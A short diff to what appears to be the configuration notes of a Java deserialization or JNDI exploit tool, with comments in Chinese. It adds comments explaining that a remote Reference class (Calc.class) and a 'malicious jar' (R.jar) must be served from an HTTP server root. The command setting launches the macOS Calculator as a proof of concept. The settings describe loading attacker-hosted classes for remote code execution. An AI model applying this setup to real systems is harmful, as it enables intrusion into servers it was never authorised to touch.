@@ -86,10 +86,10 @@
             CMD=/System/Applications/Calculator.app/Contents/MacOS/Calculator
             #或者 CMD=/bin/bash,-c,/System/Applications/Calculator.app/Contents/MacOS/Calculator
             
-            #Reference远程class代码url
+            #Reference远程class代码url（在http服务器根存在一个Calc.class）
             CODEBASE=http://127.0.0.1:80,Calc
             
-            #恶意jar包url
+            #恶意jar包url（在http服务器根存在一个R.jar，jar包中存在一个恶意的class - Calc.class）
             JAR=http://127.0.0.1:8080/R.jar,Calc
             
             #DNS服务url
